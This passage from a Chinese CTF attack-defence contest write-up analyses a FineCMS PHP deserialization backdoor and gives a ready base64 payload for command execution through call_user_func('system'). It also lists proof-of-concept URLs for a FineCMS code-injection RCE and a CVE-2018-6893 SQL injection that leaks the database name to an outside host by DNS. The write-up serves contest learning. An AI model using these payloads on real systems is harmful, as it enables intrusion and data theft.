class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">$config = unserialize(base64_decode($config));</span><br><span class="line"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'param'</span>])){</span><br><span class="line">    $config-&gt;$_GET[<span class="hljs-string">'param'</span>];</span><br><span class="line">}</span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FinecmsConfig</span></span>{</span><br><span class="line">    <span class="hljs-keyword">private</span> $config;</span><br><span class="line">    <span class="hljs-keyword">private</span> $path;</span><br><span class="line">    <span class="hljs-keyword">public</span> $filter;</span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($config=<span class="hljs-string">""</span>)</span></span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;config = $config;</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-number">123</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getConfig</span><span class="hljs-params">()</span></span>{</span><br><span class="line">        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;config == <span class="hljs-string">""</span>){</span><br><span class="line">            $config = <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'Finecmsconfig'</span>])?$_POST[<span class="hljs-string">'Finecmsconfig'</span>]:<span class="hljs-string">""</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">SetFilter</span><span class="hljs-params">($value)</span></span>{</span><br><span class="line">        </span><br><span class="line">        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;filter){</span><br><span class="line">            <span class="hljs-keyword">foreach</span>(<span class="hljs-keyword">$this</span>-&gt;filter <span class="hljs-keyword">as</span> $filter){</span><br><span class="line"></span><br><span class="line">                </span><br><span class="line">                $array = is_array($value)?array_map($filter,$value):call_user_func($filter,$value);</span><br><span class="line">            }</span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;filter = <span class="hljs-keyword">array</span>();</span><br><span class="line">        }<span class="hljs-keyword">else</span>{</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span><span class="hljs-params">($key)</span></span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;SetFilter($key);</span><br><span class="line">        <span class="hljs-keyword">die</span>(<span class="hljs-string">""</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>开头看起来有个马的样子。</p><p>直接定位该文件的引用位置:<code>finecms/Init.php</code>，看到关键函数这里，我们可以看到</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_COOKIE[<span class="hljs-string">'FINECMS_CONFIG'</span>])){</span><br><span class="line">    $config = $_COOKIE[<span class="hljs-string">'FINECMS_CONFIG'</span>];</span><br><span class="line">    <span class="hljs-keyword">require</span> FCPATH.<span class="hljs-string">'dayrui/config/config.class.php'</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>在<code>index.php</code>可以找到<code>FCPATH</code>的<code>define</code></p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="hljs-string">'FCPATH'</span>, dirname(<span class="hljs-keyword">__FILE__</span>).<span class="hljs-string">'/finecms/'</span>);</span><br></pre></td></tr></tbody></table></figure><p></p><p>所以上面那段代码就是把这个<code>config.class.php</code>给引入进来。而<code>$config</code>由<code>Init.php</code>中的<code>cookie</code>中的<code>FINECMS_CONFIG</code>取得。</p><p>整个代码逻辑就是先获取<code>cookie</code>中的<code>FINECOMS_CONFIG</code>的参数，然后调用<code>config.class.php</code>，先对<code>$config</code>进行<code>base64</code>解码，再进行反序列化，检查是否有<code>GET</code>请求传参，有的话就访问<code>$config-&gt;$param</code>。</p><p>而在<code>SetFilter($value)</code>函数中我们可以看到有<code>call_user_func($filter,$value);</code>，这里我们可以利用任意命令执行漏洞。</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(<span class="hljs-string">'system'</span>,<span class="hljs-string">'ls'</span>);</span><br></pre></td></tr></tbody></table></figure><p></p><p>如此可以直接执行<code>system(ls)</code>。所以我们需要让<code>call_user_func($filter,$value);</code>中的参数</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$filter = <span class="hljs-string">'system'</span>;<span class="hljs-comment">//$value即为函数传参</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>所以我们先构造一个<code>$FinecmsConfig</code>对象实例，将其序列化。</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FinecmsConfig</span></span>{</span><br><span class="line">    <span class="hljs-keyword">private</span> $config;</span><br><span class="line">    <span class="hljs-keyword">private</span> $path;</span><br><span class="line">    <span class="hljs-keyword">public</span> $filter=<span class="hljs-keyword">array</span>(<span class="hljs-string">'system'</span>);</span><br><span class="line">}</span><br><span class="line">$fine = <span class="hljs-keyword">new</span> FinecmsConfig();</span><br><span class="line"><span class="hljs-keyword">echo</span> base64_encode(serialize($fine));</span><br></pre></td></tr></tbody></table></figure><p></p><p>将得到的<code>base64</code>加密后的字符串传入<code>$config</code>，传入参数<code>$param</code>实现任意命令执行。测试代码如下：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$config = <span class="hljs-string">'TzoxMzoiRmluZWNtc0NvbmZpZyI6Mzp7czoyMToiAEZpbmVjbXNDb25maWcAY29uZmlnIjtOO3M6MTk6IgBGaW5lY21zQ29uZmlnAHBhdGgiO3M6NDoicGF0aCI7czo2OiJmaWx0ZXIiO2E6MTp7aTowO3M6Njoic3lzdGVtIjt9fQ=='</span>;</span><br><span class="line">$param = <span class="hljs-string">'ls'</span>;</span><br><span class="line">$config = unserialize(base64_decode($config));</span><br><span class="line"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($param)){</span><br><span class="line">    $config-&gt;$param;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>在这里，反序列化之后调用的<code>__wakeup()</code>这个魔术函数，而上段代码中并没有，所以并不会产生什么影响。</p><blockquote><p>若被解序列化的变量是一个对象，在成功地重新构造对象之后，PHP 会自动地试图去调用 <a href="http://php.net/manual/zh/language.oop5.magic.php#object.wakeup" target="_blank" rel="noopener">__wakeup()</a> 成员函数（如果存在的话）。</p></blockquote><p>好，我们全部梳理一遍，真正利用的点就是在<code>SetFilter</code>利用<code>call_user_func</code>这个函数，而调用<code>SetFilter</code>的函数就是<code>__get()</code>这个魔术方法，这个魔术方法的触发条件是：</p><blockquote><p>当调用当前环境下未定义或不<a href="http://php.net/manual/zh/language.oop5.visibility.php" target="_blank" rel="noopener">可见</a>的类属性或方法时，重载方法会被调用。</p><p>也就是说如果我们访问一个实例不存在的成员，或者私有成员变量的话，就会触发</p></blockquote><p>所以，<code>$config-&gt;$param;</code>在这里触发，而<code>$param</code>可控，而且它也作为是<code>call_user_func</code>的传入回调函数的参数，就造成了任意代码利用</p><p>所以整个代码的漏洞利用，应该是先构造一个<code>$filter=array('system')</code>的<code>FinecmsConfig</code>实例，因为原代码中是需要先<code>base64</code>解码之后再反序列化，我们就先将其序列化之后再用<code>base64</code>加密，得到</p><p></p><figure class="highlight gcode hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzoxMzoiRmluZW<span class="hljs-symbol">Ntc0</span><span class="hljs-symbol">NvbmZpZyI6</span>Mzp<span class="hljs-number">7</span>czoyMToiAEZpbmVjbX<span class="hljs-symbol">NDb25</span>maWcAY<span class="hljs-number">29</span>uZml<span class="hljs-symbol">nIjtOO3</span><span class="hljs-name">M6</span>MTk<span class="hljs-number">6</span>IgBGaW<span class="hljs-number">5</span>lY<span class="hljs-number">21</span>zQ<span class="hljs-number">29</span>uZml<span class="hljs-symbol">nAHBhdGgiO3</span><span class="hljs-name">M6</span><span class="hljs-symbol">NDoicGF0</span>aCI<span class="hljs-number">7</span>cz<span class="hljs-meta">o2</span>OiJmaWx<span class="hljs-number">0</span>ZXIi<span class="hljs-meta">O2</span>E<span class="hljs-number">6</span>MTp<span class="hljs-number">7</span>aTow<span class="hljs-meta">O3</span><span class="hljs-name">M6</span><span class="hljs-symbol">Njoic3</span>lzdGVtIjt<span class="hljs-number">9</span>fQ==</span><br></pre></td></tr></tbody></table></figure><p></p><p>即可用<code>GET</code>参数<code>param</code>任意命令执行。</p><h4 id="Poc-4-1"><a href="#Poc-4-1" class="headerlink" title="Poc 4"></a>Poc 4</h4><p>详细见：</p><blockquote><p><a href="https://zhuanlan.zhihu.com/p/35133267" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/35133267</a></p><p><a href="http://lu4n.com/finecms-rce-0day/" target="_blank" rel="noopener">http://lu4n.com/finecms-rce-0day/</a></p></blockquote><p>payload:</p><p></p><figure class="highlight sas hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/<span class="hljs-meta">index</span>.php?c=Api<span class="hljs-variable">&amp;m</span>=html<span class="hljs-variable">&amp;name</span>=search<span class="hljs-variable">&amp;format</span>=html<span class="hljs-variable">&amp;params</span>={<span class="hljs-string">"search_sql"</span>:<span class="hljs-string">"action=cache name=block.L]=phpinfo()&amp;$cache[L"</span>}</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="Poc-5"><a href="#Poc-5" class="headerlink" title="Poc 5"></a>Poc 5</h4><p>cms自带漏洞：编号CVE-2018-6893</p><p>详细见：</p><blockquote><p><a href="https://bbs.ichunqiu.com/thread-36673-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-36673-1-1.html</a></p></blockquote><blockquote><p>/index.php?s=member&amp;c=api&amp;m=checktitle&amp;id=13&amp;title=123&amp;module=news,(selectload_file(concat(0x5c5c5c5c,database(),0x2e6e65766a32372e636579652e696f5c5c616461)))as total</p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>主要是自己在这方面积累的并不多吧，西湖那次说实话确实有点水分，挺作秀的。比赛水平并不是很高，自己跟队友也是混到了第6左右，也是个人的第二次攻防赛；第三次攻防赛稍微对上次有点经验，不过还是自己见识太少了，太菜了…排名比较靠中，也是因为都是通过线上赛筛选过来的队伍，所以实力都很强。不得不说的是，红帽杯的web2的<code>checker</code>只检查<code>index.php</code>和<code>admin.php</code>，我们删了很多其他东西，就稳定得分了。。一方面是记录流量的准备不是很充分，<code>waf</code>也并没有准备，基本就是准备了一些心理准备吧hhhh。对于不死马的处理以及对于自己对自己的维护环境没有权限的情况没有经验，这里可以简述一下前面两者的处理方法，不死马的处理可以通过覆写一句话马的文件或者重启<code>web</code>服务，对于自己<code>web</code>目录没有权限的情况可以自己拿自己的<code>shell</code>达到获取权限的目的。</p><p>之后可能会写一写攻防赛的经验总结吧…还是得等这段期末过吧..</p><script>window.imageLazyLoadSetting={isSPA:!1,preloadRatio:1,processImages:null}</script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})})</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var e=n.imageLazyLoadSetting.isSPA,i=n.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e()},t.src!==i&&(n.src=i)}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this)</script><script>window.imageLazyLoadSetting={isSPA:!1,preloadRatio:1,processImages:null}</script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})})</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var e=n.imageLazyLoadSetting.isSPA,i=n.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e()},t.src!==i&&(n.src=i)}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this)</script></body></html></div><div class="columns is-variable is-1 is-multiline is-mobile"> <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/AWD/">#AWD</a></span></div><hr><blockquote class="colorquote info"><p>Article Author: Zeddy</p><p>Article Link: https://blog.zeddyu.info/2018/06/27/%E8%AE%B0%E5%87%A0%E6%AC%A1%E6%94%BB%E9%98%B2%E8%B5%9B/index.html</p><p>Copyright Notice: With the exception of the special statement at the beginning of the article, all articles can be reprinted in accordance with the CC BY 4.0 agreement with the author&#39;s permission.</p></blockquote><blockquote class="colorquote success"><p>Ad: I am looking for some guys who have a strong interest in CTFs to build a team focused on international CTFs that are on the ctftime.org, if anyone is interested in this idea you can take a look at here: https://blog.zeddyu.info/advertisement/</p><p>Ad: 想了解更多有意思的国际赛 CTF 中 Web 知识技巧，欢迎加入我的 <a href="https://blog.zeddyu.info/advertisement/#知识星球" target="_blank" rel="noopener">知识星球</a> ; 另外我正在召集一群小伙伴组建一支专注国际 CTF 的队伍，如果有感兴趣的小伙伴也可在 <a href="https://blog.zeddyu.info/advertisement/#International-CTF-Team" target="_blank" rel="noopener">International CTF Team</a> 查看详情</p></blockquote><div class="columns is-mobile is-multiline article-nav"> <span class="column is-12-mobile is-half-desktop article-nav-prev"><a href="/2018/08/26/Mac-idea-%E5%90%AF%E5%8A%A8tomcat%E7%AB%AF%E5%8F%A3%E5%8D%A0%E7%94%A8%E5%A5%87%E5%BC%82%E9%97%AE%E9%A2%98/">Mac idea 启动tomcat端口占用奇异问题</a></span> <span class="column is-12-mobile is-half-desktop article-nav-next"><a href="/2018/06/26/%E8%AE%B0%E4%B8%80%E9%81%93%E6%AF%94%E8%BE%83%E7%AE%80%E5%8D%95%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/">记一道比较简单的上传绕过</a></span></div></article><div class="comments"><h3 class="title is-4">Comments</h3><script>function loadDisqus(){var e=document,n=e.createElement("script");n.src="https://cdn.jsdelivr.net/npm/disqusjs@1.3/dist/disqus.js",l=e.createElement("link"),l.href="https://cdn.jsdelivr.net/npm/disqusjs@1.3/dist/disqusjs.css",l.setAttribute("rel","stylesheet"),(e.head||e.body).appendChild(n),e.head.appendChild(l),n.onload=function(){new DisqusJS({shortname:"zeddyu",siteName:"blog.zeddyu.info",identifier:document.location.origin+document.location.pathname+document.location.search,url:document.location.origin+document.location.pathname+document.location.search,title:document.title,api:"https://blog.zeddyu.info/api/",apikey:"57m1j10pU1WfesAhs8Ri3OcmPEaRmoyIuNCPcYaUu6mqWu6Ek4qvRiQf9CXl2JoH",admin:"ZeddYu",adminLabel:""})}}var runningOnBrowser="undefined"!=typeof window,isBot=runningOnBrowser&&!("onscroll"in window)||"undefined"!=typeof navigator&&/(gle|ing|ro|msn)bot|crawl|spider|yand|duckgo/i.test(navigator.userAgent);setTimeout(function(){isBot||loadDisqus()},1)</script><div id="disqus_thread"></div></div></div></section><footer class="footer"><div class="container"><div class="columns content"><div class="column is-narrow has-text-centered"> &copy; 2021 Zedd&nbsp; Powered by <a href="http://hexo.io/" target="_blank" rel="noopener noreferrer">Hexo</a> & <a href="http://github.com/ppoffice/hexo-theme-minos">Minos</a></div><div class="column is-hidden-mobile"></div><div class="column is-narrow"><div class="columns is-mobile is-multiline is-centered"> <a class="column is-narrow has-text-black" title="GitHub" href="https://github.com/ZeddYu" target="_blank" rel="noopener">GitHub</a> <a class="column is-narrow has-text-black" title="RSS" href="https://blog.zeddyu.info/atom.xml">RSS</a> <a class="column is-narrow has-text-black" title="Twitter" href="https://twitter.com/ZeddYu_Lu" target="_blank" rel="noopener">Twitter</a></div></div></div></div></footer><script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.24.0/moment-with-locales.min.js"></script><script>moment.locale("en-AU")</script><script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.6/clipboard.min.js"></script><style>.hljs{position:relative}.hljs .clipboard-btn{float:right;color:#9a9a9a;background:0 0;border:none;cursor:pointer}.hljs .clipboard-btn:hover{color:#8a8a8a}.hljs>.clipboard-btn{display:none;position:absolute;right:4px;top:4px}.hljs:hover>.clipboard-btn{display:inline}.hljs>figcaption>.clipboard-btn{margin-right:4px}</style><script>$(document).ready(function(){$("figure.hljs").each(function(t,e){var a="code-"+t,r=e.querySelector(".code"),c=$('<button>Copy <i class="far fa-clipboard"></i></button>');r.id=a,c.addClass("clipboard-btn"),c.attr("data-clipboard-target-id",a);var n=e.querySelector("figcaption");n?n.append(c[0]):e.prepend(c[0])}),new ClipboardJS(".clipboard-btn",{target:function(t){return document.getElementById(t.getAttribute("data-clipboard-target-id"))}}).on("success",function(t){t.clearSelection()})})</script><script src="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/js/script.js"></script><script src="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/js/insight.js"></script><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1740444562387978" crossorigin="anonymous"></script><div class="searchbox ins-search"><div class="searchbox-mask"></div><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"> <input type="text" class="searchbox-input ins-search-input" placeholder="Type something..."><span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"></div></div></div></div><script>window.INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)"},CONTENT_URL:"/content.json"}</script><script>window.imageLazyLoadSetting={isSPA:!1,preloadRatio:1,processImages:null}</script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})})</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var e=n.imageLazyLoadSetting.isSPA,i=n.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e()},t.src!==i&&(n.src=i)}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this)</script></body></html>